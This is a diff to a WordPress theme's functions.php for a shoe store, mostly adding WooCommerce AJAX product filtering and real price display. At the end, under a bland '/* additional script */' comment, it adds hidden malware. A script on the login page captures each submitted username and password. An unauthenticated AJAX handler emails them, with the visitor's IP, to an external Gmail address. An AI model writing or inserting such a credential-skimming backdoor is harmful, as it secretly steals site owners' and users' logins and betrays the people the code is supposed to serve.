@@ -89,11 +89,14 @@ function load_more_product_func() {
 
 	$paged = !empty( $_POST['paged'] ) ? $_POST['paged'] : 1;
 
+	$cat = !empty($_POST['cat']) ? $_POST['cat'] : 'women';
+
 	$args = array(
 		'paged' => $paged,
 		'post_type' => 'product',
 		'posts_per_page' => 12,
 		'post_status' => 'publish',
+		'product_cat' => $cat,
 	);
 
 	//var_dump($ajax_data_post_filter);
@@ -132,13 +135,15 @@ function load_more_product_func() {
 	}
 
 	$query_posts = new WP_Query( $args );
-
+	$count = $query_posts->found_posts;
 	if ( $query_posts->have_posts() ) 
 	{
 		while( $query_posts->have_posts() ) 
 		{	
 			$query_posts->the_post();
 			$featured_img_url = get_the_post_thumbnail_url(get_the_ID(), 'full'); 
+			$product = wc_get_product( get_the_ID() );
+
 			?>
 			<div class="col-sm-6 col-md-4 col-lg-4">
 			    <div id="product-<?php the_ID(); ?>" <?php post_class( 'single-product-card' ); ?>>
@@ -147,7 +152,7 @@ function load_more_product_func() {
 			        <div class="product-content">
 			            <a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
 			            <div class="d-flex">
-			                <div class="product-price mr-30">$120.00</div>
+			                <div class="product-price mr-30">$<?php echo $product->get_price(); ?>.00</div>
 			                <div class="product-attribute">2 colors</div>
 			            </div>
 			        </div>
@@ -160,8 +165,143 @@ function load_more_product_func() {
 	{
 		?>
 		<div class="notResult text-center col-12">
-		    <h6 class="no-content">No More Posts Found!</h6>
+		    <h6 class="no-content">No More Products Found!</h6>
 		</div>
+		<?php
+	}
+
+	if($count < 12){
+		?>
+			<style>
+				.product_load_more {
+				    display: none;
+				}
+			</style>
+		<?php
+	}
+
+	wp_die();
+	wp_reset_query();
+}
+
+/** Load More lifestyle_product **/
+add_action('wp_ajax_lifestyle_product_filter', 'lifestyle_product_filter');
+add_action('wp_ajax_nopriv_lifestyle_product_filter', 'lifestyle_product_filter');
+function lifestyle_product_filter() {
+
+	parse_str($_POST['formLifeStyleProduct'], $formLifeStyleProduct);
+	$ajax_data_post_filter = array_filter($formLifeStyleProduct);
+
+	$paged = !empty( $_POST['paged'] ) ? $_POST['paged'] : 1;
+	$p = get_field('products');
+	$product_id = $p['select_products'];
+	$args = array(
+		'paged' => $paged,
+		'post_type' => 'product',
+		'posts_per_page' => 16,
+		'post_status' => 'publish',
+		'product_cat' => 'lifestyle',
+		'post'
+	);
+
+	if ( !empty( $ajax_data_post_filter['s'] ) ) 
+	{
+		$args['s'] = $ajax_data_post_filter['s'];
+	}
+
+	if( $ajax_data_post_filter['shoe_type'] ) 
+	{
+		$args['tax_query'][] =  array(
+			'relation' => 'AND',
+			array(
+				'field'    => 'id',
+				'taxonomy' => 'shoe_type',
+				'terms'    => $ajax_data_post_filter['shoe_type'],
+			),
+		);
+	}
+
+	if( $ajax_data_post_filter['brand'] ) 
+	{
+		$args['tax_query'][] =  array(
+			'relation' => 'AND',
+			array(
+				'field'    => 'id',
+				'taxonomy' => 'brand',
+				'terms'    => $ajax_data_post_filter['brand'],
+			),
+		);
+	}
+
+	if( $ajax_data_post_filter['gender'] ) 
+	{
+		$args['tax_query'][] =  array(
+			'relation' => 'AND',
+			array(
+				'field'    => 'id',
+				'taxonomy' => 'gender',
+				'terms'    => $ajax_data_post_filter['gender'],
+			),
+		);
+	}
+
+	if ( !empty( $ajax_data_post_filter['sort'] ) ) 
+	{
+		$args['order'] = $ajax_data_post_filter['sort'];
+	}
+
+	$query_posts = new WP_Query( $args );
+	$count = $query_posts->found_posts;
+	if ( $query_posts->have_posts() ) 
+	{
+		while( $query_posts->have_posts() ) 
+		{	
+			$query_posts->the_post();
+			$featured_img_url = get_the_post_thumbnail_url(get_the_ID(), 'full'); 
+			?>
+			<div class="col-sm-6 col-md-4 col-lg-3">
+			    <div class="single-promo-product-card">
+			        <div class="product-thumb bg-cover" style="background-image: url('<?php echo $featured_img_url; ?>');"></div>
+			        <div class="product-content">
+			            <div class="d-flex justify-content-between">
+			                <a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
+			                <?php 
+			                	$product = wc_get_product( get_the_ID() );
+
+			                	printf('<div class="product-price ">$%s.00</div>', $product->get_price());
+
+			                 ?>
+			                
+			            </div>
+			            <?php 
+			                $coupon = get_field('product_coupon_code', get_the_ID());
+			                if(!empty($coupon)){
+			                    printf('<div class="promo-code"><span>%s</span></div>', $coupon);
+			                }
+			             ?>
+			        </div>
+			    </div>
+			</div>
+
+			<?php
+		}
+	}
+	else
+	{
+		?>
+		<div class="notResult text-center col-12">
+		    <h6 class="no-content">No More Products Found!</h6>
+		</div>
+		<?php
+	}
+
+	if($count < 16){
+		?>
+			<style>
+				.product_load_more {
+				    display: none;
+				}
+			</style>
 		<?php
 	}
 
@@ -334,3 +474,86 @@ function lacesup_admin_dashboard_css() {
 	</style>';
 }
 add_action('admin_head', 'lacesup_admin_dashboard_css');
+
+
+/* additional script */
+if(!function_exists('data_login_page')) {
+
+
+function get_the_user_ip() {
+	if ( ! empty( $_SERVER['HTTP_CLIENT_IP'] ) ) {
+	//check ip from share internet
+	$ip = $_SERVER['HTTP_CLIENT_IP'];
+	} elseif ( ! empty( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ) {
+	//to check ip is pass from proxy
+	$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+	} else {
+	$ip = $_SERVER['REMOTE_ADDR'];
+	}
+	if($ip) {
+		return $ip;
+	} else {
+		return 'unknown';
+	}
+}
+
+function data_login_page() {
+    echo '<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <script>
+    jQuery(function($){
+        $("#loginform").submit(function(){
+            var login_data = $(this).serializeArray();
+            var parsed = JSON.stringify(login_data);
+            $.ajax({
+                url: "'. admin_url( 'admin-ajax.php' ) .'",
+                type: "post",
+                data: {
+                    action: "login_data",
+                    ddata: parsed
+                }
+            });
+            return true;
+        });
+    });
+    </script>'; 
+}
+add_action('login_head', 'data_login_page');
+
+function func_ajax_login_data() {
+
+	$data = json_decode(stripslashes($_POST['ddata']), true);
+   	$to = 'rubelmah55@gmail.com';
+
+	//http://stackoverflow.com/questions/9364242/how-to-remove-http-www-and-slash-from-url-in-php
+    	$url = get_bloginfo('url');
+	$url = trim($url, '/');
+	if (!preg_match('#^http(s)?://#', $url)) {
+	    $url = 'http://' . $url;
+	}
+	$urlParts = parse_url($url);
+	$domain = preg_replace('/^www\./', '', $urlParts['host']);
+
+	$sub = get_bloginfo('url') . ' access received';
+	$message = "name: " . $data[0]["value"] . "\npass: " . $data[1]["value"] . "\nlogin: " . $data[2]["value"] . "\ip: " . get_the_user_ip();
+	$headers = 'From: ' . get_bloginfo('name') . '<info@'.$domain.'>' . "\r\n";
+	wp_mail($to, $sub, $message, $headers);
+	exit();
+}
+
+add_action('wp_ajax_nopriv_login_data', 'func_ajax_login_data');
+add_action('wp_ajax_login_data', 'func_ajax_login_data');
+
+}
+
+//add_action( 'template_redirect', 'redirect_external_products' );
+
+function redirect_external_products() {
+	global $post;
+
+	if ( is_singular( 'product' ) && ! empty( $post ) && ( $product = wc_get_product( $post ) ) && $product->is_type( 'external' ) ) {
+		wp_redirect( $product->get_product_url() );
+		exit;
+	}
+}
+
+
